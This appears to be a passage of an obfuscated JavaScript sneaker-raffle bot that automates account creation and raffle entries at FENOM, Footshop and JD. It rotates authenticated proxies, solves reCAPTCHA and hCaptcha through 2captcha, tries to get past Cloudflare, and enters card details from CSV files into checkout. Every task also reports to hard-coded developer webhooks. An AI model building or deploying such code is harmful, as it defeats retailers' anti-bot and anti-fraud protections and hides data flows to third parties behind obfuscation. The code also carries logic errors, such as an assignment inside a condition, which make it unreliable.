                                await _0x59b28d['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x3e2842 = 'no', console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20Account\x20' + _0x283c9c[_0x2b24be]['Email'] + '\x20Generated')), _0x5e446e['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x283c9c[_0x2b24be]['Email'] + ',' + _0x283c9c[_0x2b24be]['Password']);
                                try {
                                    _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x374317['succesDEVMSG']);
                                } catch {
                                }
                                await _0x40545a(_0x14be92, _0x374317['succesDEVMSG']);
                            } catch (_0x3674b0) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x3674b0);
                            }
                        } catch (_0x2eff53) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20' + _0x2eff53)), _0x2d3e5d = '' + _0x2eff53;
                            var _0x328bd6 = await _0xb1aeae(_0x283c9c[_0x2b24be], _0x5dc5ed, 'acc', !![], _0x2d3e5d);
                            _0x374317['errorDEV'] = { 'embeds': [_0x328bd6] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x374317['errorDEV']), await _0x40545a(_0x2b1b7c, _0x374317['errorDEV']), _0x3e2842 = 'yes';
                        } finally {
                            _0x29afd1['close']();
                            if (_0x3e2842 == 'yes' && _0x132735 != 0x5 && _0x2d3e5d != 'Size\x20Not\x20Found') {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20Retrying')), _0x2b24be = _0x2b24be - 0x1, _0x132735 = _0x132735 + 0x1;
                                continue;
                            }
                            _0x3e2842 == 'yes' && _0x132735 >= 0x5 && (_0x1322f8(_0x283c9c[_0x2b24be], _0x5dc5ed), _0x3e2842 = 'no', _0x132735 = 0x0), console['log'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x24d51c(_0x37837c, _0x4a62ca, _0x84bf3e) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x15bc78 = 0x0; _0x15bc78 < _0x4a62ca['length']; _0x15bc78++) {
                        if (_0x52cf7c != 'yes')
                            var _0x52cf7c = '', _0x7b8494 = 0x0;
                        var _0x51b340;
                        await _0x129938(_0x4a62ca, _0x15bc78), _0x50109a(_0x37837c['name'] + '\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20/\x20' + _0x4a62ca['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
                        const _0x39afe8 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x49d4dd = Math['round'](Math['random']() * (_0x84bf3e['length'] - 0x1)), _0x185df9 = _0x84bf3e[_0x49d4dd]['split'](':'), _0x2eaf85;
                        try {
                            _0x2eaf85 = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x185df9[0x0] + ':' + _0x185df9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2eaf85 = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x185df9[0x0] + ':' + _0x185df9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x33e893 = await _0x2eaf85['newPage'](), _0x287d38 = await _0x33e893['target']()['createCDPSession'](), { windowId: _0x459956 } = await _0x287d38['send']('Browser.getWindowForTarget');
                            await _0x33e893['authenticate']({
                                'username': '' + _0x185df9[0x2],
                                'password': '' + _0x185df9[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33e893['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x28bb81(0xbb8), await _0x287d38['send']('Browser.setWindowBounds', {
                                'windowId': _0x459956,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x28bb81(0x1f40);
                            try {
                                await _0x33e893['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x28bb81(0x1388), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Logging\x20in'), await _0x33e893['type']('input[name=\x22email\x22]', '' + _0x4a62ca[_0x15bc78]['Email']), await _0x28bb81(0x1f4), await _0x33e893['type']('input[name=\x22password\x22]', '' + _0x4a62ca[_0x15bc78]['Password']), await _0x28bb81(0x258), await _0x33e893['$eval']('#login-form', _0x20cb0d => _0x20cb0d['submit']()), await _0x33e893['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x28bb81(0x1f4), await _0x33e893['goto']('' + _0x4a62ca[_0x15bc78]['Url']), await _0x33e893['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4a62ca[_0x15bc78]['Size']);
                            if (_0x4a62ca[_0x15bc78]['Size'] != 'RANDOM') {
                                var _0xccb7c3 = '\x20' + _0x4a62ca[_0x15bc78]['Size'] + '\x20';
                                const _0x29a78d = await _0x33e893['$x']('//span[contains(text(),\x20' + _0xccb7c3 + ')]');
                                await _0x29a78d[0x0]['click']();
                            } else {
                                const _0x18a41c = await _0x33e893['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x19fef7 = Math['round'](Math['random']() * (_0x18a41c['length'] - 0x1));
                                await _0x18a41c[_0x19fef7]['click']();
                            }
                            await _0x28bb81(0x258), await _0x33e893['click']('#cookieChoiceDismiss'), await _0x28bb81(0x3e8), await _0x33e893['type']('#instagram-account', '' + _0x4a62ca[_0x15bc78]['Follower']), await _0x28bb81(0x28a), await _0x33e893['click']('#book-btn'), await _0x28bb81(0xbb8), await _0x33e893['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x28bb81(0x1f4), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20' + _0x2367c9['cyan']('Solving\x20Captcha')), await _0x33e893['solveRecaptchas'](), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x28bb81(0x7d0), await _0x33e893['$eval']('#book-btn-for-sure', _0x283b4b => _0x283b4b['click']()), await _0x28bb81(0x12c), await _0x33e893['click']('#book-btn-for-sure'), await _0x28bb81(0xdac);
                            const _0x228b71 = await _0x33e893['$eval']('.reservation-popup\x20>\x20.title', _0x3e4b36 => {
                                return _0x3e4b36['innerHTML'];
                            });
                            if (_0x228b71) {
                                _0x52cf7c = 'no', _0x4d8543(_0x4a62ca[_0x15bc78], _0x37837c), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x469837 = await _0xb1aeae(_0x4a62ca[_0x15bc78], _0x37837c, 'dev', ![]), _0x26c146 = await _0xb1aeae(_0x4a62ca[_0x15bc78], _0x37837c, 'pub', ![]);
                                const _0x5bf48d = {
                                    'succesDEVMSG': { 'embeds': [_0x469837] },
                                    'succesPUBMSG': { 'embeds': [_0x26c146] }
                                };
                                try {
                                    _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x5bf48d['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x5bf48d['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x4a9ac0, _0x5bf48d['succesPUBMSG']);
                                } catch (_0x3a494c) {
                                    console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3a494c));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x264796) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20' + _0x264796)), _0x51b340 = '' + _0x264796;
                            var _0x92fd9c = await _0xb1aeae(_0x4a62ca[_0x15bc78], _0x37837c, 'dev', !![], _0x51b340), _0x469837 = await _0xb1aeae(_0x4a62ca[_0x15bc78], _0x37837c, 'dev', ![]), _0x26c146 = await _0xb1aeae(_0x4a62ca[_0x15bc78], _0x37837c, 'pub', ![]);
                            const _0x3a7172 = {
                                'succesDEVMSG': { 'embeds': [_0x469837] },
                                'succesPUBMSG': { 'embeds': [_0x26c146] }
                            };
                            _0x3a7172['errorDEV'] = { 'embeds': [_0x92fd9c] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x3a7172['errorDEV']), await _0x40545a(_0x2b1b7c, _0x3a7172['errorDEV']), _0x264796 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x52cf7c = 'yes');
                        } finally {
                            _0x2eaf85['close']();
                            if (_0x52cf7c == 'yes' && _0x7b8494 != 0x5 && _0x51b340 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Task\x20' + (_0x15bc78 + 0x1) + '\x20:\x20Retrying')), _0x15bc78 = _0x15bc78 - 0x1, _0x7b8494 = _0x7b8494 + 0x1;
                                continue;
                            }
                            _0x52cf7c == 'yes' && _0x7b8494 >= 0x5 && (_0x1322f8(_0x4a62ca[_0x15bc78], _0x37837c), _0x52cf7c = 'no', _0x7b8494 = 0x0), console['log'](_0x51d312() + '\x20[' + _0x37837c['name'] + ']\x20Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x5ef3b1, _0x2ca28a, _0x373766) {
                _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x37b240['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x206038 = 0x0; _0x206038 < _0x2ca28a['length']; _0x206038++) {
                    var _0x1b62b7;
                    if (_0x6bff3f != 'yes')
                        var _0x6bff3f = '', _0x392c2c = 0x0;
                    var _0x45b402 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x340f37
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2ca28a[_0x206038]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2ca28a[_0x206038]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x37b240['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2de2a3
                            }
                        ]
                    }], _0x1558e7 = await _0xb1aeae(_0x2ca28a[_0x206038], _0x5ef3b1, 'dev', ![]), _0x4e6047 = await _0xb1aeae(_0x2ca28a[_0x206038], _0x5ef3b1, 'pub', ![]);
                    const _0x2d6b5c = {
                        'succesDEVMSG': { 'embeds': [_0x1558e7] },
                        'succesPUBMSG': { 'embeds': [_0x4e6047] }
                    }, _0xc899a2 = { 'embeds': _0x45b402 };
                    await _0x129938(_0x2ca28a, _0x206038);
                    if (_0x2ca28a[_0x206038]['Email'] == '' || _0x2ca28a[_0x206038]['FirstName'] == '' || _0x2ca28a[_0x206038]['LastName'] == '' || _0x2ca28a[_0x206038]['Country'] == '' || _0x2ca28a[_0x206038]['Size'] == '' || _0x2ca28a[_0x206038]['Address1'] == '' || _0x2ca28a[_0x206038]['Zip'] == '') {
                        console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2ca28a[_0x206038]['Email'] == '' || _0x2ca28a[_0x206038]['FirstName'] == '' || _0x2ca28a[_0x206038]['LastName'] == '' || _0x2ca28a[_0x206038]['Country'] == '' || _0x2ca28a[_0x206038]['Size'] == '' || _0x2ca28a[_0x206038]['Address1'] == '' || _0x2ca28a[_0x206038]['Zip'] == '' || _0x2ca28a[_0x206038]['Phone'] == '') {
                        console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x8fa42f = '' + _0x2ca28a[_0x206038]['Url'];
                    if (_0x37b240['useRandomProxy'] = ![])
                        var _0x22376e = _0x373766[_0x206038]['split'](':');
                    else
                        var _0x2ad10c = Math['round'](Math['random']() * (_0x373766['length'] - 0x1)), _0x22376e = _0x373766[_0x2ad10c]['split'](':');
                    const _0x3f3aa7 = await _0x3b2a97['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x22376e[0x0] + ':' + _0x22376e[0x1]]
                    });
                    try {
                        const _0x28c4b6 = await _0x3f3aa7['newPage']();
                        await _0x28c4b6['authenticate']({
                            'username': '' + _0x22376e[0x2],
                            'password': '' + _0x22376e[0x3]
                        }), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28c4b6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x28c4b6['setRequestInterception'](!![]), _0x28c4b6['on']('request', _0x4bff69 => {
                            _0x4bff69['resourceType']() === 'image' || _0x4bff69['resourceType']() === 'font' || _0x4bff69['resourceType']() === 'media' ? _0x4bff69['abort']() : _0x4bff69['continue']();
                        }), await _0x28c4b6['goto'](_0x8fa42f), await _0x28bb81(0xbb8), await _0x28c4b6['waitForSelector']('.control__JhutY'), await _0x28c4b6['click']('.control__JhutY'), await _0x28bb81(0x1f4);
                        if (_0x2ca28a[_0x206038]['Size'] != 'RANDOM')
                            try {
                                const _0x12113e = await _0x28c4b6['$x']('//div[contains(text(),\x20\x27' + _0x2ca28a[_0x206038]['Size'] + '\x27)]');
                                await _0x12113e[0x0]['click']();
                            } catch {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x4bc3d1 = await _0x28c4b6['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0xaf087e = Math['round'](Math['random']() * (_0x4bc3d1['length'] - 0x1));
                            await _0x4bc3d1[_0xaf087e]['click']();
                        }
                        await _0x28bb81(0x4b0);
                        const _0x161450 = await _0x28c4b6['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x161450[0x0]['click'](), await _0x28c4b6['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x28c4b6['type']('input[name=\x22email\x22]', '' + _0x2ca28a[_0x206038]['Email']), await _0x28bb81(0x640), await _0x28c4b6['type']('input[name=\x22phone\x22]', '' + _0x2ca28a[_0x206038]['Phone']), await _0x28bb81(0x4b0), await _0x28c4b6['click']('button.btn.continue-button__1RtsS'), await _0x28bb81(0x4b0);
                        try {
                            await _0x28c4b6['type']('input[name=\x22firstName\x22]', '' + _0x2ca28a[_0x206038]['FirstName']), await _0x28bb81(0x258);
                        } catch {
                            const _0x359394 = await _0x28c4b6['$$eval']('.invalid-feedback\x20>\x20div', _0x390cb5 => {
                                return _0x390cb5['map'](_0x2484ce => _0x2484ce['innerText']);
                            });
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20' + _0x359394));
                            continue;
                        }
                        await _0x28c4b6['type']('input[name=\x22lastName\x22]', '' + _0x2ca28a[_0x206038]['LastName']), await _0x28bb81(0xc8), await _0x28c4b6['type']('input[name=\x22instagramUsername\x22]', '' + _0x2ca28a[_0x206038]['Follower']), await _0x28bb81(0x4b0), await _0x28c4b6['click']('button.btn.continue-button__1RtsS'), await _0x28bb81(0x3e8), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x28c4b6['select']('select[name=\x22country\x22]', '' + _0x2ca28a[_0x206038]['Country']), await _0x28bb81(0x2bc), await _0x28c4b6['type']('input[name=\x22streetName\x22]', '' + _0x2ca28a[_0x206038]['Address1']), await _0x28bb81(0x258), await _0x28c4b6['type']('input[name=\x22houseNumber\x22]', _0x2ca28a[_0x206038]['HouseNumber'] + '\x20' + _0x2ca28a[_0x206038]['Address2']), await _0x28bb81(0xc8), await _0x28c4b6['type']('input[name=\x22postalCode\x22]', '' + _0x2ca28a[_0x206038]['Zip']), await _0x28bb81(0x1f4), await _0x28c4b6['type']('input[name=\x22city\x22]', '' + _0x2ca28a[_0x206038]['City']), await _0x28bb81(0x4b0), await _0x28c4b6['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x28bb81(0x4b0), await _0x28c4b6['click']('button.btn.continue-button__1RtsS'), await _0x28bb81(0x4b0), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x28c4b6['solveRecaptchas'](), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x28bb81(0xbb8), await _0x28c4b6['click']('button.btn.continue-button__1RtsS'), await _0x28bb81(0x1388), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x28c4b6['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x28c4b6['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x28bb81(0x4b0), await _0x28c4b6['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2ca28a[_0x206038]['CardNumber']), await _0x28bb81(0x320), await _0x28c4b6['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x28c4b6['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2ca28a[_0x206038]['ExpiryDate']), await _0x28bb81(0x4b0), await _0x28c4b6['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x28c4b6['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2ca28a[_0x206038]['CVV']), await _0x28bb81(0x226), await _0x28c4b6['type']('input[name=\x22holderName\x22]', '' + _0x2ca28a[_0x206038]['NameOnCard']), await _0x28bb81(0x226), await _0x28c4b6['click']('button.adyen-checkout__button'), console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x28c4b6['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x28bb81(0xbb8);
                        } catch (_0x8bf87e) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1b62b7 = '3DS\x20Error\x20' + _0x8bf87e;
                            var _0x34d28e = await _0xb1aeae(_0x2ca28a[_0x206038], _0x5ef3b1, 'dev', !![], _0x1b62b7);
                            _0x2d6b5c['errorDEV'] = { 'embeds': [_0x34d28e] };
                            _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x2d6b5c['errorDEV']);
                            await _0x40545a(_0x2b1b7c, _0x2d6b5c['errorDEV']);
                            continue;
                        }
                        _0x4d8543(_0x2ca28a[_0x206038], _0x5ef3b1), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                            try {
                                await _0x40545a(_0x37b240['webhook'], _0x2d6b5c['succesDEVMSG']);
                            } catch {
                            }
                        await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x2d6b5c['succesDEVMSG']), await _0x28bb81(0xc8);
                        try {
                            await _0x40545a(_0x4a9ac0, _0x2d6b5c['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x1c2b8f) {
                        console['log'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20' + _0x1c2b8f), _0x1b62b7 = '' + _0x1c2b8f;
                        var _0x34d28e = await _0xb1aeae(_0x2ca28a[_0x206038], _0x5ef3b1, 'dev', !![], _0x1b62b7);
                        _0x2d6b5c['errorDEV'] = { 'embeds': [_0x34d28e] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x2d6b5c['errorDEV']), await _0x40545a(_0x2b1b7c, _0x2d6b5c['errorDEV']), _0x6bff3f = 'yes';
                    } finally {
                        _0x3f3aa7['close']();
                        if (_0x6bff3f == 'yes' && _0x392c2c != 0x5) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5ef3b1['name'] + ']\x20Task\x20' + (_0x206038 + 0x1) + '\x20:\x20Retrying')), _0x206038 = _0x206038 - 0x1, _0x392c2c = _0x392c2c + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x37b240['footshopDelay'] + '\x20ms'), await _0x28bb81(_0x37b240['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x5c3fc7, _0x373707, _0x101b57) {
                var _0x14580e = ![], _0x35698f = ![];
                if (_0x37b240['captchaKey'] == '' || _0x37b240['captchaKey'] == undefined)
                    return console['log'](_0x2367c9['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x37b240['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xbd91d5 = 0x0; _0xbd91d5 < _0x373707['length']; _0xbd91d5++) {
                    if (_0x5964b3 != 'yes')
                        var _0x5964b3 = '', _0x8ffbf3 = 0x0;
                    var _0x21ba84, _0x142afd = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x373707[_0xbd91d5]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x373707[_0xbd91d5]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x340f37
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x37b240['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2de2a3
                            }
                        ]
                    }];
                    const _0x5185f0 = { 'embeds': _0x142afd };
                    _0x50109a(_0x5c3fc7['name'] + '\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20/\x20' + _0x373707['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x373707, _0xbd91d5);
                    var _0x191b97 = await _0xb1aeae(_0x373707[_0xbd91d5], _0x5c3fc7, 'dev', ![]), _0x209c9b = await _0xb1aeae(_0x373707[_0xbd91d5], _0x5c3fc7, 'pub', ![]);
                    const _0x1ea802 = {
                        'succesDEVMSG': { 'embeds': [_0x191b97] },
                        'succesPUBMSG': { 'embeds': [_0x209c9b] }
                    };
                    if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                        try {
                            await _0x40545a(_0x37b240['webhook'], _0x1ea802['succesDEVMSG']);
                        } catch {
                        }
                    await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x1ea802['succesDEVMSG']), await _0x28bb81(0xc8);
                    try {
                        await _0x40545a(_0x4a9ac0, _0x1ea802['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x373707[_0xbd91d5]['Email'] == '' || _0x373707[_0xbd91d5]['Url'] == '' || _0x373707[_0xbd91d5]['FirstName'] == '' || _0x373707[_0xbd91d5]['LastName'] == '') {
                        console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x37b240['useRandomProxy'] = ![])
                        var _0xcbc4ff = _0x101b57[_0xbd91d5]['split'](':');
                    else
                        var _0x510a2a = Math['round'](Math['random']() * (_0x101b57['length'] - 0x1)), _0xcbc4ff = _0x101b57[_0x510a2a]['split'](':');
                    const _0x21bdf6 = await _0x3b2a97['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0xcbc4ff[0x0] + ':' + _0xcbc4ff[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x3bd858 = await _0x21bdf6['newPage']();
                        await _0x3bd858['authenticate']({
                            'username': '' + _0xcbc4ff[0x2],
                            'password': '' + _0xcbc4ff[0x3]
                        }), console['log'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3bd858['setRequestInterception'](!![]), _0x3bd858['on']('request', _0x32747a => {
                            _0x32747a['resourceType']() === 'image' || _0x32747a['resourceType']() === 'font' || _0x32747a['resourceType']() === 'media' ? _0x32747a['abort']() : _0x32747a['continue']();
                        }), await _0x3bd858['goto']('' + _0x373707[_0xbd91d5]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x3bd858['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3bd858['type']('#comp_firstname', '' + _0x373707[_0xbd91d5]['FirstName']), await _0x3bd858['waitForSelector']('#comp_lastname'), await _0x3bd858['type']('#comp_lastname', '' + _0x373707[_0xbd91d5]['LastName']), await _0x3bd858['waitForSelector']('#comp_email'), await _0x3bd858['type']('#comp_email', '' + _0x373707[_0xbd91d5]['Email']), await _0x3bd858['waitForSelector']('#comp_paypalemail'), await _0x3bd858['type']('#comp_paypalemail', '' + _0x373707[_0xbd91d5]['Email']), await _0x3bd858['waitForSelector']('#comp_mobile_end'), await _0x3bd858['type']('#comp_mobile_end', '' + _0x373707[_0xbd91d5]['Phone']), await _0x3bd858['waitForSelector']('#comp_dob'), await _0x3bd858['type']('#comp_dob', '08/09/1992'), console['log'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Choosing\x20Size');
